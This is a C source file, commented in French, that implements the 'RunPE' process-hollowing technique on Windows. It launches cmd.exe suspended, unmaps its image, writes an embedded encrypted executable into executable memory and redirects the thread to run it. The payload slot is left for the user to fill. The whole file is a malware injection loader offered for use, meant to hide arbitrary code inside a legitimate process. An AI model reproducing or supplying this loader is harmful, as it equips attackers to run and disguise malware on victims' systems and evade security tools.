#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(WINAPI* NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);

// ⚙️ Replace these with your payload
unsigned char payload[] = { /* ... votre EXE chiffré à injecter ... */ };
unsigned int payload_len = sizeof(payload);

// 👨‍💻 Fonction pour démarrer un processus suspendu
BOOL RunPE(LPCSTR targetPath, unsigned char* payloadData, DWORD payloadSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    LPVOID baseAddress = NULL;
    NtUnmapViewOfSection_t NtUnmapViewOfSection = 
        (NtUnmapViewOfSection_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessA failed: %d\n", GetLastError());
        return FALSE;
    }

    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] GetThreadContext failed\n");
        return FALSE;
    }

#ifdef _WIN64
    PVOID pebBase = (PVOID)(ctx.Rdx + 0x10);
#else
    PVOID pebBase = (PVOID)(ctx.Ebx + 0x08);
#endif

    // Lire l’adresse de l’image
    ReadProcessMemory(pi.hProcess, pebBase, &baseAddress, sizeof(PVOID), NULL);

    // Nettoyer l’ancienne image
    if (NtUnmapViewOfSection)
        NtUnmapViewOfSection(pi.hProcess, baseAddress);

    // Allouer mémoire pour le payload
    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, baseAddress, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        printf("[-] VirtualAllocEx failed\n");
        return FALSE;
    }

    // Écriture du payload
    if (!WriteProcessMemory(pi.hProcess, remoteBase, payloadData, payloadSize, NULL)) {
        printf("[-] WriteProcessMemory failed\n");
        return FALSE;
    }

    // Mise à jour du pointeur d’entrée
#ifdef _WIN64
    ctx.Rcx = (DWORD64)remoteBase + ((PIMAGE_NT_HEADERS64)(payloadData + ((PIMAGE_DOS_HEADER)payloadData)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
#else
    ctx.Eax = (DWORD)((DWORD)remoteBase + ((PIMAGE_NT_HEADERS)(payloadData + ((PIMAGE_DOS_HEADER)payloadData)->e_lfanew))->OptionalHeader.AddressOfEntryPoint);
#endif

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    return TRUE;
}

int main() {
    // 👇 Ici vous pouvez passer une cible par défaut, par exemple cmd.exe
    RunPE("C:\\Windows\\System32\\cmd.exe", payload, payload_len);
    return 0;
}
